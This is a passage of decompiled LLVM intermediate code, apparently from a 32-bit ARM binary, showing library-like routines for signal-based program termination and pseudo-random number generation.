  store i32 %v1_fce8, i32* %r5.global-to-local, align 4
  %v3_fcec = inttoptr i32 %v1_fce8 to i32*
  store i32 %arg3, i32* %v3_fcec, align 4
  %v0_fcf0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fcf0, i32* @r3, align 4
  %v0_fcf4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_fcf4, i32* @r2, align 4
  %v0_fcf8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_fcf8, i32* @r1, align 4
  %v0_fcfc = call i32 @function_fbe0()
  br label %dec_label_pc_fd00

dec_label_pc_fd00:                                ; preds = %dec_label_pc_fcdc, %dec_label_pc_fce8
  %v0_fd00 = load i32, i32* %r5.global-to-local, align 4
  %v2_fd04 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_fd04, i32* @r4, align 4
  ret i32 %v0_fd00

; uselistorder directives
  uselistorder i32 %v3_fc90, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_fc54, { 1, 0 }
  uselistorder i32 %v3_fc34, { 2, 3, 1, 0 }
  uselistorder i32 %v0_fc80, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_fc78, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @function_fbe0, { 1, 0 }
  uselistorder i32 ()* @function_fc00, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fd00, { 1, 0 }
  uselistorder label %dec_label_pc_fce8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fcdc, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_fc28, { 1, 0 }
}

define i32 @function_fd08() local_unnamed_addr {
dec_label_pc_fd24.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_fd08 = ptrtoint i32* %stack_var_-268 to i32
  %v1_fd18 = call i32 @function_10838()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_fd24 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_fd24

dec_label_pc_fd24:                                ; preds = %dec_label_pc_fd24.lr.ph, %dec_label_pc_fd24
  %v1_fd28 = phi i32 [ 31, %dec_label_pc_fd24.lr.ph ], [ %v1_fd34, %dec_label_pc_fd24 ]
  %v4_fd28 = mul i32 %v1_fd28, 4
  %v5_fd28 = add i32 %v4_fd28, %v2_fd24
  %v2_fd30 = add i32 %v5_fd28, -128
  %v3_fd30 = inttoptr i32 %v2_fd30 to i32*
  store i32 0, i32* %v3_fd30, align 4
  %v0_fd34 = load i32, i32* %r1.global-to-local, align 4
  %v1_fd34 = add i32 %v0_fd34, -1
  store i32 %v1_fd34, i32* %r1.global-to-local, align 4
  %v6_fd34 = icmp slt i32 %v1_fd34, 0
  br i1 %v6_fd34, label %dec_label_pc_fd3c, label %dec_label_pc_fd24

dec_label_pc_fd3c:                                ; preds = %dec_label_pc_fd24
  %v2_fd3c = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_fd3c, i32* @r4, align 4
  store i32 6, i32* %r1.global-to-local, align 4
  %v2_fd48 = call i32 @function_131d0(i32 %v2_fd3c, i32 6)
  %v2_fd4c = icmp eq i32 %v2_fd48, 0
  br i1 %v2_fd4c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_fd3c
  store i32 %v2_fd3c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_fd3c, %bb
  store i32 64864, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_fd4c, i32 ptrtoint (i32* @global_var_10f84.446 to i32))
  %v2_fd64 = load i32, i32* @global_var_21b20.448, align 4
  %v2_fd68 = icmp eq i32 %v2_fd64, 0
  br i1 %v2_fd68, label %dec_label_pc_fd70, label %dec_label_pc_fda0

dec_label_pc_fd70:                                ; preds = %.thread1
  store i32 1, i32* @global_var_21b20.448, align 4
  br label %dec_label_pc_fd78

dec_label_pc_fd78:                                ; preds = %dec_label_pc_fdf0, %dec_label_pc_fd70
  %v1_fd84 = call i32 @function_10838()
  %v1_fd8c = call i32 @function_13194(i32 6)
  store i32 64928, i32* @lr, align 4
  %v1_fd9c = call i32 @function_10838()
  %v2_fda4.pre = load i32, i32* @global_var_21b20.448, align 4
  br label %dec_label_pc_fda0

dec_label_pc_fda0:                                ; preds = %.thread1, %dec_label_pc_fd78
  %v0_fe14 = phi i32 [ %v2_fd64, %.thread1 ], [ %v2_fda4.pre, %dec_label_pc_fd78 ]
  store i32 ptrtoint (i32* @global_var_21b20.448 to i32), i32* %ip.global-to-local, align 4
  %v7_fda8 = icmp eq i32 %v0_fe14, 1
  br i1 %v7_fda8, label %dec_label_pc_fdd8.lr.ph, label %dec_label_pc_fe0c

dec_label_pc_fdd8.lr.ph:                          ; preds = %dec_label_pc_fda0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_21b20.448, align 4
  %v2_fdc4 = bitcast i32* %stack_var_-268 to i8*
  %v3_fdc4 = call i32 @function_ec20(i8* %v2_fdc4, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_fdd8

dec_label_pc_fdd8:                                ; preds = %dec_label_pc_fdd8.lr.ph, %dec_label_pc_fdd8
  %v1_fddc = phi i32 [ 31, %dec_label_pc_fdd8.lr.ph ], [ %v1_fde8, %dec_label_pc_fdd8 ]
  %v4_fddc = mul i32 %v1_fddc, 4
  %v5_fddc = add i32 %v4_fddc, %v2_fd24
  %v2_fde4 = add i32 %v5_fddc, -264
  %v3_fde4 = inttoptr i32 %v2_fde4 to i32*
  store i32 -1, i32* %v3_fde4, align 4
  %v0_fde8 = load i32, i32* %r1.global-to-local, align 4
  %v1_fde8 = add i32 %v0_fde8, -1
  store i32 %v1_fde8, i32* %r1.global-to-local, align 4
  %v6_fde8 = icmp slt i32 %v1_fde8, 0
  br i1 %v6_fde8, label %dec_label_pc_fdf0, label %dec_label_pc_fdd8

dec_label_pc_fdf0:                                ; preds = %dec_label_pc_fdd8
  store i32 %v2_fd08, i32* %r1.global-to-local, align 4
  %v4_fe04 = call i32 @function_10b24(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_fd78

dec_label_pc_fe0c:                                ; preds = %dec_label_pc_fda0
  %v7_fe0c = icmp eq i32 %v0_fe14, 2
  br i1 %v7_fe0c, label %dec_label_pc_fe14, label %dec_label_pc_fe20

dec_label_pc_fe14:                                ; preds = %dec_label_pc_fe0c
  store i32 3, i32* @global_var_21b20.448, align 4
  %v0_fe1c = call i32 @function_fd08()
  %v2_fe20.pre = load i32, i32* @global_var_21b20.448, align 4
  br label %dec_label_pc_fe20

dec_label_pc_fe20:                                ; preds = %dec_label_pc_fe0c, %dec_label_pc_fe14
  %v1_fe28 = phi i32 [ %v0_fe14, %dec_label_pc_fe0c ], [ %v2_fe20.pre, %dec_label_pc_fe14 ]
  %v7_fe24 = icmp eq i32 %v1_fe28, 3
  br i1 %v7_fe24, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_fe20
  %v2_fe30 = load i32, i32* %ip.global-to-local, align 4
  %v3_fe30 = inttoptr i32 %v2_fe30 to i32*
  store i32 4, i32* %v3_fe30, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_fe20, %bb27
  call void @__pseudo_cond_branch(i1 %v7_fe24, i32 ptrtoint (i32* @global_var_10d38.450 to i32))
  br label %dec_label_pc_fe38

dec_label_pc_fe38:                                ; preds = %dec_label_pc_fe38, %.thread3
  %v0_fe38 = call i32 @function_fd08()
  br label %dec_label_pc_fe38

; uselistorder directives
  uselistorder i32 %v1_fde8, { 2, 1, 0 }
  uselistorder i32 %v1_fd34, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 5, 6, 7, 9, 8, 2 }
  uselistorder i32* @global_var_21b20.448, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_fe20, { 1, 0 }
  uselistorder label %dec_label_pc_fdd8, { 1, 0 }
  uselistorder label %dec_label_pc_fda0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_fd24, { 1, 0 }
}

define i32 @function_fe50() local_unnamed_addr {
dec_label_pc_fe50:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_fe54 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1f3cc.452 to i32), i32* @r4, align 4
  %v2_fe5c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_fe5c, i32* @r0, align 4
  %v1_fe74 = call i32 @function_10840()
  %v1_fe84 = call i32 @function_10838()
  %v2_fe88 = ptrtoint i32* %stack_var_-16 to i32
  %v3_fe90 = call i32 @function_10130(i32* inttoptr (i32 127972 to i32*), i32 %v2_fe88)
  store i32 %v2_fe5c, i32* @r0, align 4
  store i32 65192, i32* @lr, align 4
  %v1_fea4 = call i32 @function_10840()
  %v3_fea8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_fe54, i32* @r4, align 4
  ret i32 %v3_fea8
}

define i32 @function_fff4(i32 %arg1) local_unnamed_addr {
dec_label_pc_fff4:
  %stack_var_-32 = alloca i32, align 4
  %v3_fff4 = load i32, i32* @r4, align 4
  %v9_fff4 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_1f3cc.452 to i32), i32* @r4, align 4
  %v2_fffc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_fffc, i32* @r0, align 4
  %v1_10018 = call i32 @function_10840()
  store i32 65580, i32* @lr, align 4
  %v1_10028 = call i32 @function_10838()
  %v0_1002c = load i32, i32* @r6, align 4
  store i32 %v0_1002c, i32* @r0, align 4
  %v2_10034 = inttoptr i32 %v0_1002c to i32*
  %v3_10034 = call i32 @function_101c0(i32* %v2_10034, i32 ptrtoint (i32* @global_var_1f3e4 to i32))
  store i32 %v2_fffc, i32* @r0, align 4
  %v1_1004c = call i32 @function_10840()
  store i32 %v3_fff4, i32* @r4, align 4
  store i32 %v9_fff4, i32* @r6, align 4
  ret i32 %v1_1004c
}

define i32 @function_10130(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10130:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_10130 = add i32 %tmp, 12
  %v2_10130 = inttoptr i32 %v1_10130 to i32*
  %v3_10130 = load i32, i32* %v2_10130, align 4
  store i32 %v3_10130, i32* %r3.global-to-local, align 4
  %v2_10134 = icmp eq i32 %v3_10130, 0
  %v3_10138 = load i32, i32* @r4, align 4
  store i32 %v3_10138, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_10144 = add i32 %tmp, 8
  %v2_10144 = inttoptr i32 %v1_10144 to i32*
  %v3_10144 = load i32, i32* %v2_10144, align 4
  store i32 %v3_10144, i32* %lr.global-to-local, align 4
  br i1 %v2_10134, label %dec_label_pc_1014c, label %dec_label_pc_10170

dec_label_pc_1014c:                               ; preds = %dec_label_pc_10130
  %v1_1014c = inttoptr i32 %v3_10144 to i32*
  %v2_1014c = load i32, i32* %v1_1014c, align 4
  store i32 %v2_1014c, i32* %r2.global-to-local, align 4
  %v2_10154 = mul i32 %v2_1014c, 1103515245
  %v1_1015c = add i32 %v2_10154, 12345
  %tmp10 = bitcast i32 %v1_1015c to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_10160 = bitcast float %tmp11 to i32
  store i32 %v1_10160, i32* %r3.global-to-local, align 4
  store i32 %v1_10160, i32* %v1_1014c, align 4
  %v0_10168 = load i32, i32* %r3.global-to-local, align 4
  %v2_10168 = inttoptr i32 %arg2 to i32*
  store i32 %v0_10168, i32* %v2_10168, align 4
  br label %dec_label_pc_101b4

dec_label_pc_10170:                               ; preds = %dec_label_pc_10130
  %v2_10170 = load i32, i32* %arg1, align 4
  store i32 %v2_10170, i32* %r2.global-to-local, align 4
  %v1_10174 = add i32 %tmp, 4
  %v2_10174 = inttoptr i32 %v1_10174 to i32*
  %v3_10174 = load i32, i32* %v2_10174, align 4
  store i32 %v3_10174, i32* %r0.global-to-local, align 4
  %v1_10178 = inttoptr i32 %v2_10170 to i32*
  %v2_10178 = load i32, i32* %v1_10178, align 4
  store i32 %v2_10178, i32* %r3.global-to-local, align 4
  %v1_1017c = inttoptr i32 %v3_10174 to i32*
  %v2_1017c = load i32, i32* %v1_1017c, align 4
  %v4_1017c = add i32 %v3_10174, 4
  store i32 %v4_1017c, i32* %r0.global-to-local, align 4
  %v2_10180 = add i32 %v2_1017c, %v2_10178
  store i32 %v2_10180, i32* %r3.global-to-local, align 4
  store i32 %v2_10180, i32* %v1_10178, align 4
  %v3_10184 = load i32, i32* %r2.global-to-local, align 4
  %v4_10184 = add i32 %v3_10184, 4
  store i32 %v4_10184, i32* %r2.global-to-local, align 4
  %v0_10188 = load i32, i32* %ip.global-to-local, align 4
  %v1_10188 = add i32 %v0_10188, 24
  %v2_10188 = inttoptr i32 %v1_10188 to i32*
  %v3_10188 = load i32, i32* %v2_10188, align 4
  store i32 %v3_10188, i32* %r4.global-to-local, align 4
  %v0_1018c = load i32, i32* %r3.global-to-local, align 4
  %v3_1018c = udiv i32 %v0_1018c, 2
  store i32 %v3_1018c, i32* %r3.global-to-local, align 4
  %v3_10190 = icmp ult i32 %v4_10184, %v3_10188
  %v1_10194 = load i32, i32* %r5.global-to-local, align 4
  %v2_10194 = inttoptr i32 %v1_10194 to i32*
  store i32 %v3_1018c, i32* %v2_10194, align 4
  br i1 %v3_10190, label %dec_label_pc_101a4, label %bb

bb:                                               ; preds = %dec_label_pc_10170
  %v1_10198 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_10198, i32* %r2.global-to-local, align 4
  %v0_1019c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1019c, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_101a4:                               ; preds = %dec_label_pc_10170
  %v0_1019c1 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1019c1, i32* %r3.global-to-local, align 4
  %v1_101a4 = load i32, i32* %r4.global-to-local, align 4
  %v3_101a4 = icmp ult i32 %v0_1019c1, %v1_101a4
  br i1 %v3_101a4, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_101a4
  store i32 %v0_1019c1, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_101a4
  %v1_101ac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_101ac, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_101b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_101b0 = inttoptr i32 %v0_101b0 to i32*
  %v2_101b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_101b0, i32* %v1_101b0, align 4
  %v3_101b0 = add i32 %v0_101b0, 4
  %v4_101b0 = inttoptr i32 %v3_101b0 to i32*
  %v5_101b0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_101b0, i32* %v4_101b0, align 4
  br label %dec_label_pc_101b4

dec_label_pc_101b4:                               ; preds = %dec_label_pc_1014c, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_101b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_101b8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1019c1, { 1, 0, 2 }
  uselistorder i32 %v3_1018c, { 1, 0 }
  uselistorder i32 %v1_10160, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_101b4, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @function_101c0(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_101c0:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_101c0 = load i32, i32* @r4, align 4
  store i32 %v3_101c0, i32* %stack_var_-32, align 4
  %v6_101c0 = load i32, i32* @r5, align 4
  %v1_101c4 = add i32 %tmp, 12
  %v2_101c4 = inttoptr i32 %v1_101c4 to i32*
  %v3_101c4 = load i32, i32* %v2_101c4, align 4
  %v2_101cc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp22 = icmp ugt i32 %v3_101c4, 4
  br i1 %tmp22, label %.dec_label_pc_10278_crit_edge, label %dec_label_pc_101dc

.dec_label_pc_10278_crit_edge:                    ; preds = %dec_label_pc_101c0
  br label %dec_label_pc_10278

dec_label_pc_101dc:                               ; preds = %dec_label_pc_101c0
  %v0_101dc = load i32, i32* @r0, align 4
  %v2_101dc = icmp eq i32 %v0_101dc, 0
  %v1_101e0 = add i32 %tmp, 8
  %v2_101e0 = inttoptr i32 %v1_101e0 to i32*
  %v3_101e0 = load i32, i32* %v2_101e0, align 4
  store i32 %v3_101e0, i32* %r7.global-to-local, align 4
  br i1 %v2_101dc, label %bb, label %bb19

bb:                                               ; preds = %dec_label_pc_101dc
  store i32 1, i32* @r0, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_101dc, %bb
  %v0_101ec = phi i32 [ %v0_101dc, %dec_label_pc_101dc ], [ 1, %bb ]
  %v2_101e8 = icmp eq i32 %v3_101c4, 0
  %v2_101ec = inttoptr i32 %v3_101e0 to i32*
  store i32 %v0_101ec, i32* %v2_101ec, align 4
  br i1 %v2_101e8, label %dec_label_pc_10274, label %dec_label_pc_101f4

dec_label_pc_101f4:                               ; preds = %bb19
  %v1_101f4 = add i32 %tmp, 16
  %v2_101f4 = inttoptr i32 %v1_101f4 to i32*
  %v3_101f4 = load i32, i32* %v2_101f4, align 4
  store i32 %v3_101f4, i32* %sb.global-to-local, align 4
  %v0_101f8 = load i32, i32* @r0, align 4
  store i32 %v0_101f8, i32* @r5, align 4
  %v0_101fc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_101fc, i32* %sl.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10234

dec_label_pc_10208:                               ; preds = %dec_label_pc_10234
  %v2_10208 = call i32 @function_c930(i32 %v0_10238, i32 ptrtoint (i32* @global_var_1f31d.469 to i32))
  store i32 ptrtoint (i32* @global_var_1f31d.469 to i32), i32* @r1, align 4
  %v2_10214 = mul i32 %v2_10208, 16807
  %v0_10218 = load i32, i32* @r5, align 4
  store i32 %v0_10218, i32* @r0, align 4
  %v0_1021c = call i32 @function_149b4()
  %tmp23 = mul i32 %v0_1021c, -2836
  %v2_10228 = add i32 %v2_10214, %tmp23
  %v8_10228 = icmp slt i32 %v2_10228, 0
  br i1 %v8_10228, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_10208
  %v2_1022c = add i32 %v2_10228, 2147483647
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_10208, %bb20
  %storemerge = phi i32 [ %v2_1022c, %bb20 ], [ %v2_10228, %dec_label_pc_10208 ]
  %v0_10230 = phi i32 [ %v2_1022c, %bb20 ], [ %v2_10228, %dec_label_pc_10208 ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_10230 = load i32, i32* %sl.global-to-local, align 4
  %v2_10230 = add i32 %v1_10230, 4
  %v3_10230 = inttoptr i32 %v2_10230 to i32*
  store i32 %v0_10230, i32* %v3_10230, align 4
  %v4_10230 = load i32, i32* %sl.global-to-local, align 4
  %v5_10230 = add i32 %v4_10230, 4
  store i32 %v5_10230, i32* %sl.global-to-local, align 4
  %v0_10234.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_10234.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_10238.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10234

dec_label_pc_10234:                               ; preds = %dec_label_pc_101f4, %bb21
  %v0_10238 = phi i32 [ %v0_101f8, %dec_label_pc_101f4 ], [ %v0_10238.pre, %bb21 ]
  %v0_1024c = phi i32 [ %v3_101f4, %dec_label_pc_101f4 ], [ %v1_10234.pre, %bb21 ]
  %v0_10240 = phi i32 [ 1, %dec_label_pc_101f4 ], [ %v0_10234.pre, %bb21 ]
  %v1_10240 = add i32 %v0_10240, 1
  store i32 %v1_10240, i32* %r8.global-to-local, align 4
  %v5_10244 = icmp slt i32 %v0_10240, %v0_1024c
  br i1 %v5_10244, label %dec_label_pc_10208, label %dec_label_pc_10248

dec_label_pc_10248:                               ; preds = %dec_label_pc_10234
  %v2_1024c = mul i32 %v0_1024c, 10
  store i32 %v2_1024c, i32* @r4, align 4
  %v0_10250 = load i32, i32* %r6.global-to-local, align 4
  %v1_10250 = add i32 %v0_10250, 20
  %v2_10250 = inttoptr i32 %v1_10250 to i32*
  %v3_10250 = load i32, i32* %v2_10250, align 4
  %v0_10254 = load i32, i32* %r7.global-to-local, align 4
  %v4_10254 = mul i32 %v3_10250, 4
  %v5_10254 = add i32 %v0_10254, %v4_10254
  %v1_10258 = inttoptr i32 %v0_10250 to i32*
  store i32 %v5_10254, i32* %v1_10258, align 4
  %v3_10258 = add i32 %v0_10250, 4
  %v4_10258 = inttoptr i32 %v3_10258 to i32*
  %v5_10258 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_10258, i32* %v4_10258, align 4
  br label %dec_label_pc_10264

dec_label_pc_10260:                               ; preds = %dec_label_pc_10264
  %v0_10268 = load i32, i32* %r6.global-to-local, align 4
  %v2_10260 = inttoptr i32 %v0_10268 to i32*
  %v3_10260 = call i32 @function_10130(i32* %v2_10260, i32 %v2_101cc)
  br label %dec_label_pc_10264

dec_label_pc_10264:                               ; preds = %dec_label_pc_10248, %dec_label_pc_10260
  %v0_10264 = load i32, i32* @r4, align 4
  %v1_10264 = add i32 %v0_10264, -1
  store i32 %v1_10264, i32* @r4, align 4
  %v6_10264 = icmp slt i32 %v1_10264, 0
  br i1 %v6_10264, label %dec_label_pc_10274, label %dec_label_pc_10260

dec_label_pc_10274:                               ; preds = %dec_label_pc_10264, %bb19
  %v2_1027c.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_10278

dec_label_pc_10278:                               ; preds = %.dec_label_pc_10278_crit_edge, %dec_label_pc_10274
  %v2_1027c = phi i32 [ %v3_101c0, %.dec_label_pc_10278_crit_edge ], [ %v2_1027c.pre, %dec_label_pc_10274 ]
  %v26_1027c = phi i32 [ -1, %.dec_label_pc_10278_crit_edge ], [ 0, %dec_label_pc_10274 ]
  store i32 %v2_1027c, i32* @r4, align 4
  store i32 %v6_101c0, i32* @r5, align 4
  ret i32 %v26_1027c

; uselistorder directives
  uselistorder i32 %v1_10264, { 1, 0 }
  uselistorder i32 %v0_10250, { 1, 0, 2 }
  uselistorder i32 %v0_10240, { 1, 0 }
  uselistorder i32 %v2_10228, { 0, 3, 2, 1 }
  uselistorder i32 %v3_101c4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1f31d.469 to i32), { 1, 0 }
  uselistorder label %dec_label_pc_10278, { 1, 0 }
  uselistorder label %dec_label_pc_10264, { 1, 0 }
  uselistorder label %dec_label_pc_10234, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_10280(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10280:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_10280 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10280, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_10280
  %v1_10280 = load i32, i32* @r0, align 4
  %v2_10280 = load i32, i32* @r7, align 4
  %v5_10280 = udiv i32 %v2_10280, 8
  %v6_10280 = and i32 %v5_10280, %v1_10280
  store i32 %v6_10280, i32* @r4, align 4
  %v2_10284 = load i32, i32* @sp, align 4
  %v8_10284 = shl i32 %v2_10284, %arg4
  %v9_10284 = and i32 %v8_10284, %tmp
  call void @__pseudo_branch(i32 %v9_10284)
  %v0_10288.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10288.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v1_10288 = load i32, i32* @r0, align 4
  %v2_10288 = load i32, i32* @r4, align 4
  %v3_10288 = load i32, i32* @fp, align 4
  %v8_10288 = shl i32 %v2_10288, %v3_10288
  %v9_10288 = and i32 %v8_10288, %v1_10288
  store i32 %v9_10288, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10280, %.thread, %bb
  %v3_10290 = load i32, i32* @r4, align 4
  store i32 %v3_10290, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg4, i32* @r5, align 4
  %tmp31 = icmp ult i32 %arg3, 128
  br i1 %tmp31, label %dec_label_pc_102b0, label %dec_label_pc_102a0

dec_label_pc_102a0:                               ; preds = %.thread1
  %v2_102a0 = icmp ugt i32 %arg3, 254
  %v7_102a0 = icmp eq i32 %arg3, 255
  %v2_102a4 = xor i1 %v7_102a0, true
  %v3_102a4 = and i1 %v2_102a0, %v2_102a4
  br i1 %v3_102a4, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_102a0
  store i32 4, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_102a0, %bb22
  %v1_102d89 = phi i32 [ %v3_10290, %dec_label_pc_102a0 ], [ 4, %bb22 ]
  %v2_102a8 = xor i1 %v2_102a0, true
  %v3_102a8 = or i1 %v7_102a0, %v2_102a8
  br i1 %v3_102a8, label %bb24, label %bb28

bb24:                                             ; preds = %bb23
  store i32 3, i32* @r4, align 4
  br label %bb28

dec_label_pc_102b0:                               ; preds = %.thread1
  %tmp32 = icmp ugt i32 %arg3, 31
  br i1 %tmp32, label %dec_label_pc_102c8, label %dec_label_pc_102b8

dec_label_pc_102b8:                               ; preds = %dec_label_pc_102b0
  %tmp33 = icmp ugt i32 %arg3, 7
  br i1 %tmp33, label %.thread12, label %dec_label_pc_10334

.thread12:                                        ; preds = %dec_label_pc_102b8
  store i32 0, i32* @r4, align 4
  br label %bb28

dec_label_pc_102c8:                               ; preds = %dec_label_pc_102b0
  %v2_102c8 = icmp ugt i32 %arg3, 62
  %v7_102c8 = icmp eq i32 %arg3, 63
  %v2_102cc = xor i1 %v7_102c8, true
  %v3_102cc = and i1 %v2_102c8, %v2_102cc
  br i1 %v3_102cc, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_102c8
  store i32 2, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_102c8, %bb25
  %v1_102d88 = phi i32 [ %v3_10290, %dec_label_pc_102c8 ], [ 2, %bb25 ]
  %v2_102d0 = xor i1 %v2_102c8, true
  %v3_102d0 = or i1 %v7_102c8, %v2_102d0
  br i1 %v3_102d0, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  store i32 1, i32* @r4, align 4
  br label %bb28

bb28:                                             ; preds = %.thread12, %bb24, %bb23, %bb26, %bb27
  %v1_102e0 = phi i32 [ 3, %bb24 ], [ %v1_102d89, %bb23 ], [ %v1_102d88, %bb26 ], [ 1, %bb27 ], [ 0, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_16948.472 to i32), i32* %r2.global-to-local, align 4
  %v4_102d8 = mul i32 %v1_102e0, 4
  %v5_102d8 = add i32 %v4_102d8, ptrtoint (i32* @global_var_16948.472 to i32)
